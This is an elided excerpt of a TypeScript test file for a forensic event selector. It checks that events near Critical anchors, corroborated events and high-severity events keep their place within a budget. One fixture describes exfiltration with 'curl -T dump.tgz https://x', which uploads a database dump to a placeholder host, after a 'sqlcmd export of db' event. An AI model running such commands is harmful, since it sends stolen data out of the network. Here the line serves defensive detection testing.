...
function ev(
  partial: Partial<ForensicEvent> & { id: string; timestamp: string; severity: Severity },
): ForensicEvent {
  return {
...
describe("selectSynthesisEventsAnnotated — chain-aware reserved budgets", () => {
  it("pulls low-severity same-host events near a Critical anchor in as anchor_context", () => {
    ...
    for (let i = 0; i < 200; i++) {
      ...
      events.push(
        ev({
          id: `noise${i}`,
          timestamp: `2026-05-20T${hh}:${mm}:00Z`,
          severity: "Info",
          asset: "NOISEHOST",
        }),
      );
    ...
    events.push(
      ev({
        ...
        description: "sqlcmd export of db",
      }),
    );
    events.push(
      ev({
    ...
    events.push(
      ev({
        ...
        description: "curl -T dump.tgz https://x",
      }),
    );
  ...
  it("gives corroborated (2+ source) events a reserved seat over uncorroborated noise", () => {
    ...
    for (let i = 0; i < 300; i++) {
      events.push(
        ev({
          id: `n${i}`,
          timestamp: `2026-05-20T00:00:${String(i % 60).padStart(2, "0")}Z`,
          severity: "Info",
          asset: "H",
        }),
      );
  ...
  it("still keeps ALL Critical/High anchors and never exceeds max", () => {
    ...
    for (let i = 0; i < 60; i++)
      events.push(
        ev({
          id: `hi${i}`,
          timestamp: `2026-05-20T${String(i % 24).padStart(2, "0")}:00:00Z`,
          severity: "High",
          asset: "H",
        }),
      );
    for (let i = 0; i < 200; i++)
      events.push(
        ev({
          id: `lo${i}`,
          timestamp: `2026-05-21T${String(i % 24).padStart(2, "0")}:00:00Z`,
          severity: "Info",
          asset: "H",
        }),
      );
  ...
  it("returns everything with zero omitted when under budget", () => {
    const events = [
      ev({ id: "a", timestamp: "2026-05-20T09:00:00Z", severity: "Low" }),
      ev({ id: "b", timestamp: "2026-05-20T10:00:00Z", severity: "Low" }),
    ];
